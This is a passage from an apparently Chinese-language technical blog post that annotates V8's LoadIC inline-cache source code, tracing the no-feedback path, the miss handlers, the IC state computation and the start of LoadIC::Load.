<span class="built_in">GotoIfNot</span>(<span class="built_in">TaggedEqual</span>(feedback, <span class="built_in">MegamorphicSymbolConstant</span>()), miss); <span class="comment">// 检查是否为megamorphic状态</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">TryProbeStubCache</span>(<span class="built_in">isolate</span>()-&gt;<span class="built_in">load_stub_cache</span>(), p-&gt;<span class="built_in">lookup_start_object</span>(),</span><br><span class="line">                      <span class="built_in">CAST</span>(p-&gt;<span class="built_in">name</span>()), if_handler, var_handler, miss); <span class="comment">// 在StubCache中寻找</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其针对 <code>megamorphic</code> 状态，在 <code>stub cache</code> 中寻找匹配的项目</p>
<p>第六部分</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;no_feedback);</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">Comment</span>(<span class="string">&quot;LoadIC_BytecodeHandler_nofeedback&quot;</span>);</span><br><span class="line">  <span class="comment">// Call into the stub that implements the non-inlined parts of LoadIC.</span></span><br><span class="line">  <span class="comment">// 本次调用没有feedback，调用Builtin kLoadIC_NoFeedback</span></span><br><span class="line">  exit_point-&gt;<span class="built_in">ReturnCallStub</span>(</span><br><span class="line">      Builtins::<span class="built_in">CallableFor</span>(<span class="built_in">isolate</span>(), Builtins::kLoadIC_NoFeedback),</span><br><span class="line">      p-&gt;<span class="built_in">context</span>(), p-&gt;<span class="built_in">receiver</span>(), p-&gt;<span class="built_in">name</span>(),</span><br><span class="line">      <span class="built_in">SmiConstant</span>(FeedbackSlotKind::kLoadProperty));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跳到 <code>no_feedback</code> 则表示此次调用没有 <code>feedback</code> ，会调用 <code>Builtin kLoadIC_NoFeedback</code> 也就是 <code>AccessorAssembler::GenerateLoadIC_NoFeedback</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::GenerateLoadIC_NoFeedback</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">using</span> Descriptor = LoadNoFeedbackDescriptor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> receiver = <span class="built_in">Parameter</span>&lt;Object&gt;(Descriptor::kReceiver);</span><br><span class="line">  <span class="keyword">auto</span> name = <span class="built_in">Parameter</span>&lt;Object&gt;(Descriptor::kName);</span><br><span class="line">  <span class="keyword">auto</span> context = <span class="built_in">Parameter</span>&lt;Context&gt;(Descriptor::kContext);</span><br><span class="line">  <span class="keyword">auto</span> ic_kind = <span class="built_in">Parameter</span>&lt;Smi&gt;(Descriptor::kICKind);</span><br><span class="line"></span><br><span class="line">  <span class="function">LoadICParameters <span class="title">p</span><span class="params">(context, receiver, name,</span></span></span><br><span class="line"><span class="params"><span class="function">                     TaggedIndexConstant(FeedbackSlot::Invalid().ToInt()),</span></span></span><br><span class="line"><span class="params"><span class="function">                     UndefinedConstant())</span></span>;</span><br><span class="line">  <span class="built_in">LoadIC_NoFeedback</span>(&amp;p, ic_kind);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其主要调用 <code>AccessorAssembler::LoadIC_NoFeedback</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::LoadIC_NoFeedback</span><span class="params">(<span class="type">const</span> LoadICParameters* p,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          TNode&lt;Smi&gt; ic_kind)</span> </span>&#123;</span><br><span class="line">  <span class="function">Label <span class="title">miss</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line">  TNode&lt;Object&gt; lookup_start_object = p-&gt;<span class="built_in">receiver_and_lookup_start_object</span>(); <span class="comment">// 获取lookup_start_object</span></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">TaggedIsSmi</span>(lookup_start_object), &amp;miss); <span class="comment">// 如果lookup_start_object是SMI，跳到miss</span></span><br><span class="line">  TNode&lt;Map&gt; lookup_start_object_map = <span class="built_in">LoadMap</span>(<span class="built_in">CAST</span>(lookup_start_object)); <span class="comment">// 获取lookup_start_object的map</span></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IsDeprecatedMap</span>(lookup_start_object_map), &amp;miss); <span class="comment">// 如果lookup_start_object的map是否为deprecated map(过期的map)，是的话跳到miss</span></span><br><span class="line"></span><br><span class="line">  TNode&lt;Uint16T&gt; instance_type = <span class="built_in">LoadMapInstanceType</span>(lookup_start_object_map); <span class="comment">// 获取lookup_start_object的map的实例</span></span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Special case for Function.prototype load, because it&#x27;s very common</span></span><br><span class="line">    <span class="comment">// for ICs that are only executed once (MyFunc.prototype.foo = ...).</span></span><br><span class="line">    <span class="comment">// 针对Function.prototype load的情况，通常来说由于这个情况只会出现一次，所以也不会缓存map</span></span><br><span class="line">    <span class="function">Label <span class="title">not_function_prototype</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line">    <span class="built_in">GotoIfNot</span>(<span class="built_in">IsJSFunctionInstanceType</span>(instance_type), &amp;not_function_prototype); <span class="comment">// 如果instance_type不是jsfunction的instance_type，则跳到not_function_prototype</span></span><br><span class="line">    <span class="built_in">GotoIfNot</span>(<span class="built_in">IsPrototypeString</span>(p-&gt;<span class="built_in">name</span>()), &amp;not_function_prototype); <span class="comment">// 如果name为prototype string，则跳到not_function_prototype</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">GotoIfPrototypeRequiresRuntimeLookup</span>(<span class="built_in">CAST</span>(lookup_start_object),</span><br><span class="line">                                         lookup_start_object_map,</span><br><span class="line">                                         &amp;not_function_prototype); <span class="comment">// 当prototype需要runtime lookup的时候跳到not_function_prototype</span></span><br><span class="line">    <span class="built_in">Return</span>(<span class="built_in">LoadJSFunctionPrototype</span>(<span class="built_in">CAST</span>(lookup_start_object), &amp;miss)); <span class="comment">// 获取jsfunction的prototype</span></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;not_function_prototype);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GenericPropertyLoad</span>(<span class="built_in">CAST</span>(lookup_start_object), lookup_start_object_map,</span><br><span class="line">                      instance_type, p, &amp;miss, kDontUseStubCache); <span class="comment">// 通常的prototype load的方法</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;miss);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">TailCallRuntime</span>(Runtime::kLoadNoFeedbackIC_Miss, p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">                    p-&gt;<span class="built_in">receiver</span>(), p-&gt;<span class="built_in">name</span>(), ic_kind);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>AccessorAssembler::LoadIC_NoFeedback</code> 会对 <code>load</code> 的情况进行区分，如果是针对 <code>function.prototype</code> 的 <code>load</code> 则使用 <code>LoadJSFunctionPrototype</code> ，否则使用 <code>GenericPropertyLoad</code></p>
<p>如果跳到 <code>miss</code> ，则会到 <code>Runtime_LoadNoFeedbackIC_Miss</code> 中</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">RUNTIME_FUNCTION</span>(Runtime_LoadNoFeedbackIC_Miss) &#123;</span><br><span class="line">  <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(<span class="number">3</span>, args.<span class="built_in">length</span>());</span><br><span class="line">  <span class="comment">// Runtime functions don&#x27;t follow the IC&#x27;s calling convention.</span></span><br><span class="line">  Handle&lt;Object&gt; receiver = args.<span class="built_in">at</span>(<span class="number">0</span>);</span><br><span class="line">  Handle&lt;Name&gt; key = args.<span class="built_in">at</span>&lt;Name&gt;(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">CONVERT_INT32_ARG_CHECKED</span>(slot_kind, <span class="number">2</span>);</span><br><span class="line">  FeedbackSlotKind kind = <span class="built_in">static_cast</span>&lt;FeedbackSlotKind&gt;(slot_kind);</span><br><span class="line"></span><br><span class="line">  Handle&lt;FeedbackVector&gt; vector = <span class="built_in">Handle</span>&lt;FeedbackVector&gt;(); <span class="comment">// 创建feedbackvector</span></span><br><span class="line">  FeedbackSlot vector_slot = FeedbackSlot::<span class="built_in">Invalid</span>();</span><br><span class="line">  <span class="comment">// This function is only called after looking up in the ScriptContextTable so</span></span><br><span class="line">  <span class="comment">// it is safe to call LoadIC::Load for global loads as well.</span></span><br><span class="line">  <span class="function">LoadIC <span class="title">ic</span><span class="params">(isolate, vector, vector_slot, kind)</span></span>;</span><br><span class="line">  ic.<span class="built_in">UpdateState</span>(receiver, key);</span><br><span class="line">  <span class="built_in">RETURN_RESULT_OR_FAILURE</span>(isolate, ic.<span class="built_in">Load</span>(receiver, key));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和 <code>Runtime_LoadIC_Miss</code> 差不多，见下面的解释</p>
<p>第七部分</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;miss);</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">Comment</span>(<span class="string">&quot;LoadIC_BytecodeHandler_miss&quot;</span>);</span><br><span class="line">  <span class="comment">// 本次调用miss，调用Builtin kLoadIC_Miss</span></span><br><span class="line">  exit_point-&gt;<span class="built_in">ReturnCallRuntime</span>(Runtime::kLoadIC_Miss, p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">                                p-&gt;<span class="built_in">receiver</span>(), p-&gt;<span class="built_in">name</span>(), p-&gt;<span class="built_in">slot</span>(),</span><br><span class="line">                                p-&gt;<span class="built_in">vector</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跳到 <code>miss</code> 则表示此次调用 <code>miss</code> ，会调用 <code>ic.cc</code> 中的 <code>RUNTIME_FUNCTION(Runtime_LoadIC_Miss)</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// Static IC stub generators.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">RUNTIME_FUNCTION</span>(Runtime_LoadIC_Miss) &#123;</span><br><span class="line">  <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(<span class="number">4</span>, args.<span class="built_in">length</span>());</span><br><span class="line">  <span class="comment">// Runtime functions don&#x27;t follow the IC&#x27;s calling convention.</span></span><br><span class="line">  Handle&lt;Object&gt; receiver = args.<span class="built_in">at</span>(<span class="number">0</span>);</span><br><span class="line">  Handle&lt;Name&gt; key = args.<span class="built_in">at</span>&lt;Name&gt;(<span class="number">1</span>);</span><br><span class="line">  Handle&lt;TaggedIndex&gt; slot = args.<span class="built_in">at</span>&lt;TaggedIndex&gt;(<span class="number">2</span>);</span><br><span class="line">  Handle&lt;FeedbackVector&gt; vector = args.<span class="built_in">at</span>&lt;FeedbackVector&gt;(<span class="number">3</span>);</span><br><span class="line">  FeedbackSlot vector_slot = FeedbackVector::<span class="built_in">ToSlot</span>(slot-&gt;<span class="built_in">value</span>());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// A monomorphic or polymorphic KeyedLoadIC with a string key can call the</span></span><br><span class="line">  <span class="comment">// LoadIC miss handler if the handler misses. Since the vector Nexus is</span></span><br><span class="line">  <span class="comment">// set up outside the IC, handle that here.</span></span><br><span class="line">  FeedbackSlotKind kind = vector-&gt;<span class="built_in">GetKind</span>(vector_slot);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">IsLoadICKind</span>(kind)) &#123;</span><br><span class="line">    <span class="function">LoadIC <span class="title">ic</span><span class="params">(isolate, vector, vector_slot, kind)</span></span>;</span><br><span class="line">    ic.<span class="built_in">UpdateState</span>(receiver, key);</span><br><span class="line">    <span class="built_in">RETURN_RESULT_OR_FAILURE</span>(isolate, ic.<span class="built_in">Load</span>(receiver, key));</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">IsLoadGlobalICKind</span>(kind)) &#123;</span><br><span class="line">    <span class="built_in">DCHECK_EQ</span>(isolate-&gt;<span class="built_in">native_context</span>()-&gt;<span class="built_in">global_proxy</span>(), *receiver);</span><br><span class="line">    receiver = isolate-&gt;<span class="built_in">global_object</span>();</span><br><span class="line">    <span class="function">LoadGlobalIC <span class="title">ic</span><span class="params">(isolate, vector, vector_slot, kind)</span></span>;</span><br><span class="line">    ic.<span class="built_in">UpdateState</span>(receiver, key);</span><br><span class="line">    <span class="built_in">RETURN_RESULT_OR_FAILURE</span>(isolate, ic.<span class="built_in">Load</span>(key));</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">DCHECK</span>(<span class="built_in">IsKeyedLoadICKind</span>(kind));</span><br><span class="line">    <span class="function">KeyedLoadIC <span class="title">ic</span><span class="params">(isolate, vector, vector_slot, kind)</span></span>;</span><br><span class="line">    ic.<span class="built_in">UpdateState</span>(receiver, key);</span><br><span class="line">    <span class="built_in">RETURN_RESULT_OR_FAILURE</span>(isolate, ic.<span class="built_in">Load</span>(receiver, key));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心逻辑主要为</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LoadIC <span class="title">ic</span><span class="params">(isolate, vector, vector_slot, kind)</span></span>;</span><br><span class="line">ic.<span class="built_in">UpdateState</span>(receiver, key);</span><br><span class="line"><span class="built_in">RETURN_RESULT_OR_FAILURE</span>(isolate, ic.<span class="built_in">Load</span>(receiver, key));</span><br></pre></td></tr></table></figure>

<p>首先使用类 <code>LoadIC</code> 获取 <code>IC</code> 状态</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IC::<span class="built_in">IC</span>(Isolate* isolate, Handle&lt;FeedbackVector&gt; vector, FeedbackSlot slot,</span><br><span class="line">       FeedbackSlotKind kind)</span><br><span class="line">    : <span class="built_in">isolate_</span>(isolate),</span><br><span class="line">      <span class="built_in">vector_set_</span>(<span class="literal">false</span>),</span><br><span class="line">      <span class="built_in">kind_</span>(kind),</span><br><span class="line">      <span class="built_in">target_maps_set_</span>(<span class="literal">false</span>),</span><br><span class="line">      <span class="built_in">slow_stub_reason_</span>(<span class="literal">nullptr</span>),</span><br><span class="line">      <span class="built_in">nexus_</span>(vector, slot) &#123;</span><br><span class="line">  <span class="built_in">DCHECK_IMPLIES</span>(!vector.<span class="built_in">is_null</span>(), kind_ == nexus_.<span class="built_in">kind</span>());</span><br><span class="line">  state_ = (vector.<span class="built_in">is_null</span>()) ? NO_FEEDBACK : nexus_.<span class="built_in">ic_state</span>();</span><br><span class="line">  old_state_ = state_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后使用 <code>nexus_.ic_state()</code> 获取 <code>IC</code> 状态</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">InlineCacheState <span class="title">FeedbackNexus::ic_state</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  MaybeObject feedback, extra;</span><br><span class="line">  std::<span class="built_in">tie</span>(feedback, extra) = <span class="built_in">GetFeedbackPair</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (<span class="built_in">kind</span>()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> FeedbackSlotKind::kLoadProperty:</span><br><span class="line">    <span class="keyword">case</span> FeedbackSlotKind::kLoadKeyed:</span><br><span class="line">    <span class="keyword">case</span> FeedbackSlotKind::kHasKeyed: &#123;</span><br><span class="line">      <span class="keyword">if</span> (feedback == <span class="built_in">UninitializedSentinel</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> UNINITIALIZED;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (feedback == <span class="built_in">MegamorphicSentinel</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> MEGAMORPHIC;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (feedback-&gt;<span class="built_in">IsWeakOrCleared</span>()) &#123;</span><br><span class="line">        <span class="comment">// Don&#x27;t check if the map is cleared.</span></span><br><span class="line">        <span class="keyword">return</span> MONOMORPHIC;</span><br><span class="line">      &#125;</span><br><span class="line">      HeapObject heap_object;</span><br><span class="line">      <span class="keyword">if</span> (feedback-&gt;<span class="built_in">GetHeapObjectIfStrong</span>(&amp;heap_object)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (heap_object.<span class="built_in">IsWeakFixedArray</span>()) &#123;</span><br><span class="line">          <span class="comment">// Determine state purely by our structure, don&#x27;t check if the maps</span></span><br><span class="line">          <span class="comment">// are cleared.</span></span><br><span class="line">          <span class="keyword">return</span> POLYMORPHIC;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (heap_object.<span class="built_in">IsName</span>()) &#123;</span><br><span class="line">          <span class="built_in">DCHECK</span>(<span class="built_in">IsKeyedLoadICKind</span>(<span class="built_in">kind</span>()) || <span class="built_in">IsKeyedStoreICKind</span>(<span class="built_in">kind</span>()) ||</span><br><span class="line">                 <span class="built_in">IsKeyedHasICKind</span>(<span class="built_in">kind</span>()));</span><br><span class="line">          Object extra_object = extra-&gt;<span class="built_in">GetHeapObjectAssumeStrong</span>();</span><br><span class="line">          WeakFixedArray extra_array = WeakFixedArray::<span class="built_in">cast</span>(extra_object);</span><br><span class="line">          <span class="keyword">return</span> extra_array.<span class="built_in">length</span>() &gt; <span class="number">2</span> ? POLYMORPHIC : MONOMORPHIC;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">UNREACHABLE</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> FeedbackSlotKind::kCall: &#123;</span><br><span class="line">      HeapObject heap_object;</span><br><span class="line">      <span class="keyword">if</span> (feedback == <span class="built_in">MegamorphicSentinel</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> GENERIC;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (feedback-&gt;<span class="built_in">IsWeakOrCleared</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (feedback-&gt;<span class="built_in">GetHeapObjectIfWeak</span>(&amp;heap_object)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (heap_object.<span class="built_in">IsFeedbackCell</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> POLYMORPHIC;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">CHECK</span>(heap_object.<span class="built_in">IsJSFunction</span>() || heap_object.<span class="built_in">IsJSBoundFunction</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> MONOMORPHIC;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (feedback-&gt;<span class="built_in">GetHeapObjectIfStrong</span>(&amp;heap_object) &amp;&amp;</span><br><span class="line">                 heap_object.<span class="built_in">IsAllocationSite</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> MONOMORPHIC;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">CHECK_EQ</span>(feedback, <span class="built_in">UninitializedSentinel</span>());</span><br><span class="line">      <span class="keyword">return</span> UNINITIALIZED;</span><br><span class="line">    &#125;</span><br><span class="line">		...</span><br><span class="line">    <span class="keyword">case</span> FeedbackSlotKind::kInvalid:</span><br><span class="line">    <span class="keyword">case</span> FeedbackSlotKind::kKindsNumber:</span><br><span class="line">      <span class="built_in">UNREACHABLE</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> UNINITIALIZED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>状态获取完毕后更新 <code>state</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IC::UpdateState</span><span class="params">(Handle&lt;Object&gt; lookup_start_object, Handle&lt;Object&gt; name)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">state</span>() == NO_FEEDBACK) <span class="keyword">return</span>;</span><br><span class="line">  <span class="built_in">update_lookup_start_object_map</span>(lookup_start_object);</span><br><span class="line">  <span class="keyword">if</span> (!name-&gt;<span class="built_in">IsString</span>()) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">state</span>() != MONOMORPHIC &amp;&amp; <span class="built_in">state</span>() != POLYMORPHIC) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (lookup_start_object-&gt;<span class="built_in">IsNullOrUndefined</span>(<span class="built_in">isolate</span>())) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove the target from the code cache if it became invalid</span></span><br><span class="line">  <span class="comment">// because of changes in the prototype chain to avoid hitting it</span></span><br><span class="line">  <span class="comment">// again.</span></span><br><span class="line">  <span class="comment">// 当目标因为原型链中的更改而变得无效的时候，从cache中删除该条目</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">ShouldRecomputeHandler</span>(Handle&lt;String&gt;::<span class="built_in">cast</span>(name))) &#123;</span><br><span class="line">    <span class="built_in">MarkRecomputeHandler</span>(name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后调用<code>IC.LOAD</code> 进行 <code>IC</code> 设置和属性加载</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MaybeHandle&lt;Object&gt; <span class="title">LoadIC::Load</span><span class="params">(Handle&lt;Object&gt; object, Handle&lt;Name&gt; name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 <span class="type">bool</span> update_feedback,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 Handle&lt;Object&gt; receiver)</span> </span>&#123;</span><br><span class="line">  <span class="type">bool</span> use_ic = (<span class="built_in">state</span>() != 